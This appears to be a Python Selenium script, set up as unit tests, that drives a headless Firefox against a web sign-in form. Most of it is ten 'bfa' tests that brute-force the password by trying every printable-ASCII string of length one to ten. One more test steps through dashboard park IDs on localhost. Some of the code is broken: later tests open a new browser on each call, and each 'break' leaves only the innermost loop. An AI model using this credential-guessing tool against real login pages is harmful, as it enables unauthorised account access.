import time
import warnings
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import unittest
import subprocess
import string

username = ""
password = ""
url = ""


# ok
def browser():
    """
    :return:
    """
    # with Firefox
    options = Options()
    options.headless = True
    browser = webdriver.Firefox(
        executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
        options=options
    )
    return browser


# ok
def bfa(browser, username, password):
    """
    :param browser:
    :param username:
    :param password:
    """
    # Insert the email
    email_input = browser.find_element(
        by=By.XPATH,
        value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[1]/input"
    )
    email_input.send_keys(username)

    time.sleep(1)

    # Insert the password
    password_input = browser.find_element(
        by=By.XPATH,
        value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[2]/input"
    )
    password_input.send_keys(password)

    time.sleep(1)

    # Click on the 'Sign in' button
    sign_in_button = browser.find_element(
        by=By.XPATH,
        value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/button"
    )
    sign_in_button.click()

    time.sleep(1)


# ok
def starting(url, browser):
    """
    :param url:
    :param browser:
    """
    time.sleep(5)

    warnings.filterwarnings(
        action="ignore",
        message="unclosed",
        category=ResourceWarning
    )

    time.sleep(5)

    time.sleep(5)

    # maximize window
    browser.maximize_window()

    time.sleep(5)

    # open
    browser.get(url)

    time.sleep(10)


class UnitTestsRPADiversIV2(unittest.TestCase):
    # ok
    def test_close_all_processes(self):
        print('test_close_all_processes')

        subprocess.run('taskkill /f /im firefox.exe')
        subprocess.run('taskkill /f /im geckodriver.exe')

    # ok
    def test_open_one_page(self):
        print('test_open_one_page')

        url = ''

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = False
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(5)

    # ok
    def test_connect(self):
        print('test_connect')

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = False
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        # Insert the email
        email_input = browser.find_element(
            by=By.XPATH,
            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[1]/input"
        )
        email_input.send_keys(username)

        time.sleep(1)

        # Insert the password
        password_input = browser.find_element(
            by=By.XPATH,
            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[2]/input"
        )
        password_input.send_keys(password)

        time.sleep(1)

        # Click on the 'Sign in' button
        sign_in_button = browser.find_element(
            by=By.XPATH,
            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/button"
        )
        sign_in_button.click()

        time.sleep(1)

        if "Invalid email or password." in browser.find_element(by=By.XPATH, value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong").text:
            print("no connection")
        else:
            print("connection")


class UnitTestsRPADiverseIV2BFA(unittest.TestCase):
    # ok
    def test_bfa_1(self):
        print('test_bfa_1')

        printable_ascii_characters = string.printable

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = True
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        for c1 in printable_ascii_characters:
            _password = c1

            # Insert the email
            email_input = browser.find_element(
                by=By.XPATH,
                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[1]/input"
            )
            email_input.send_keys(username)

            time.sleep(1)

            # Insert the password
            password_input = browser.find_element(
                by=By.XPATH,
                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[2]/input"
            )
            password_input.send_keys(_password)

            time.sleep(1)

            # Click on the 'Sign in' button
            sign_in_button = browser.find_element(
                by=By.XPATH,
                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/button"
            )
            sign_in_button.click()

            time.sleep(1)

            if "Invalid email or password." in browser.find_element(by=By.XPATH, value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong").text:
                print("no connection : " + str(_password))
            else:
                print("connection : " + str(_password))
                break

    # ok
    def test_bfa_2(self):
        print('test_bfa_2')

        printable_ascii_characters = string.printable

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = True
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                _password = str(c1) + str(c2)

                # Insert the email
                email_input = browser.find_element(
                    by=By.XPATH,
                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[1]/input"
                )
                email_input.send_keys(username)

                time.sleep(1)

                # Insert the password
                password_input = browser.find_element(
                    by=By.XPATH,
                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[2]/input"
                )
                password_input.send_keys(_password)

                time.sleep(1)

                # Click on the 'Sign in' button
                sign_in_button = browser.find_element(
                    by=By.XPATH,
                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/button"
                )
                sign_in_button.click()

                time.sleep(1)

                if "Invalid email or password." in browser.find_element(by=By.XPATH, value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong").text:
                    print("no connection : " + str(_password))
                else:
                    print("connection : " + str(_password))
                    break

    #
    def test_bfa_3(self):
        print('test_bfa_3')

        printable_ascii_characters = string.printable

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = True
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    _password = str(c1) + str(c2) + str(c3)

                    bfa(browser, username, _password)

                    if "Invalid email or password." in browser.find_element(
                            by=By.XPATH,
                            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                    ).text:
                        print("no connection : " + str(_password))
                    else:
                        print("connection : " + str(_password))
                        break

    #
    def test_bfa_4(self):
        print('test_bfa_4')

        printable_ascii_characters = string.printable

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = True
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    for c4 in printable_ascii_characters:
                        _password = str(c1) + str(c2) + str(c3) + str(c4)

                        bfa(browser, username, _password)

                        if "Invalid email or password." in browser.find_element(
                                by=By.XPATH,
                                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                        ).text:
                            print("no connection : " + str(_password))
                        else:
                            print("connection : " + str(_password))
                            break

    #
    def test_bfa_5(self):
        print('test_bfa_5')

        printable_ascii_characters = string.printable

        starting(url, browser())

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    for c4 in printable_ascii_characters:
                        for c5 in printable_ascii_characters:
                            _password = str(c1) + str(c2) + str(c3) + str(c4) + str(c5)

                            bfa(browser(), username, _password)

                            if "Invalid email or password." in browser().find_element(
                                    by=By.XPATH,
                                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                            ).text:
                                print("no connection : " + str(_password))
                            else:
                                print("connection : " + str(_password))
                                break

    #
    def test_bfa_6(self):
        print('test_bfa_6')

        printable_ascii_characters = string.printable

        starting(url, browser())

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    for c4 in printable_ascii_characters:
                        for c5 in printable_ascii_characters:
                            for c6 in printable_ascii_characters:
                                _password = str(c1) + str(c2) + str(c3) + str(c4) + str(c5) + str(c6)

                                bfa(browser(), username, _password)

                                if "Invalid email or password." in browser().find_element(
                                        by=By.XPATH,
                                        value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                                ).text:
                                    print("no connection : " + str(_password))
                                else:
                                    print("connection : " + str(_password))
                                    break

    #
    def test_bfa_7(self):
        print('test_bfa_7')

        printable_ascii_characters = string.printable

        starting(url, browser())

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    for c4 in printable_ascii_characters:
                        for c5 in printable_ascii_characters:
                            for c6 in printable_ascii_characters:
                                for c7 in printable_ascii_characters:
                                    _password = str(c1) + str(c2) + str(c3) + str(c4) + str(c5) + str(c6) + str(c7)

                                    bfa(browser(), username, _password)

                                    if "Invalid email or password." in browser().find_element(
                                            by=By.XPATH,
                                            value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                                    ).text:
                                        print("no connection : " + str(_password))
                                    else:
                                        print("connection : " + str(_password))
                                        break

    #
    def test_bfa_8(self):
        print('test_bfa_8')

        printable_ascii_characters = string.printable

        starting(url, browser())

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    for c4 in printable_ascii_characters:
                        for c5 in printable_ascii_characters:
                            for c6 in printable_ascii_characters:
                                for c7 in printable_ascii_characters:
                                    for c8 in printable_ascii_characters:
                                        _password = str(c1) + str(c2) + str(c3) + str(c4) \
                                                    + str(c5) + str(c6) + str(c7) + str(c8)

                                        bfa(browser(), username, _password)

                                        if "Invalid email or password." in browser().find_element(
                                                by=By.XPATH,
                                                value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                                        ).text:
                                            print("no connection : " + str(_password))
                                        else:
                                            print("connection : " + str(_password))
                                            break

    # ok
    def test_bfa_9(self):
        print('test_bfa_9')

        printable_ascii_characters = string.printable

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = True
        browser = webdriver.Firefox(
            executable_path='C:\\Users\\\\Jason\\Documents\\Devs\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        browser.maximize_window()

        time.sleep(5)

        # open
        browser.get(url)

        time.sleep(10)

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    for c4 in printable_ascii_characters:
                        for c5 in printable_ascii_characters:
                            for c6 in printable_ascii_characters:
                                for c7 in printable_ascii_characters:
                                    for c8 in printable_ascii_characters:
                                        for c9 in printable_ascii_characters:
                                            _password = str(c1) + str(c2) + str(c3) + str(c4) \
                                                        + str(c5) + str(c6) + str(c7) + str(c8) + str(c9)

                                            bfa(browser, username, _password)

                                            if "Invalid email or password." in browser.find_element(
                                                    by=By.XPATH,
                                                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                                            ).text:
                                                print("no connection : " + str(_password))
                                            else:
                                                print("connection : " + str(_password))
                                                break

    # ok
    def test_bfa_10(self):
        print('test_bfa_10')

        printable_ascii_characters = string.printable

        starting(url, browser())

        for c1 in printable_ascii_characters:
            for c2 in printable_ascii_characters:
                for c3 in printable_ascii_characters:
                    for c4 in printable_ascii_characters:
                        for c5 in printable_ascii_characters:
                            for c6 in printable_ascii_characters:
                                for c7 in printable_ascii_characters:
                                    for c8 in printable_ascii_characters:
                                        for c9 in printable_ascii_characters:
                                            for c10 in printable_ascii_characters:
                                                _password = str(c1) + str(c2) + str(c3) + str(c4) \
                                                            + str(c5) + str(c6) + str(c7) + str(c8) \
                                                            + str(c9) + str(c10)

                                                bfa(browser(), username, _password)

                                                if "Invalid email or password." in browser().find_element(
                                                        by=By.XPATH,
                                                        value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[1]/strong"
                                                ).text:
                                                    print("no connection : " + str(_password))
                                                else:
                                                    print("connection : " + str(_password))
                                                    break


class UnitTestsRPADiverseIV2CheckPages(unittest.TestCase):
    @staticmethod
    def test_check_all_parks():
        print('test_check_all_parks')
        _username = ""
        _password = ""

        time.sleep(5)

        warnings.filterwarnings(
            action="ignore",
            message="unclosed",
            category=ResourceWarning
        )

        time.sleep(5)

        # with Firefox
        options = Options()
        options.headless = False
        _browser = webdriver.Firefox(
            executable_path='A:\\GitHub\\Cristal_Ball\\geckodriver.exe',
            options=options
        )

        time.sleep(5)

        # maximize window
        _browser.maximize_window()

        time.sleep(5)

        for i in range(1, 120):
            _browser.get('http://localhost/dashboard/parc?parc=' + str(i))

            if _browser.current_url == "http://localhost/account/signin":
                # Insert the email
                email_input = _browser.find_element(
                    by=By.XPATH,
                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[1]/input"
                )
                email_input.send_keys(_username)

                time.sleep(1)

                # Insert the password
                password_input = _browser.find_element(
                    by=By.XPATH,
                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/div[2]/input"
                )
                password_input.send_keys(_password)

                time.sleep(1)

                # Click on the 'Sign in' button
                sign_in_button = _browser.find_element(
                    by=By.XPATH,
                    value="/html/body/div[2]/div/div/div[2]/div/div/div/div/div/div[2]/div/form/button"
                )
                sign_in_button.click()

                time.sleep(1)

            time.sleep(5)


if __name__ == '__main__':
    unittest.main()
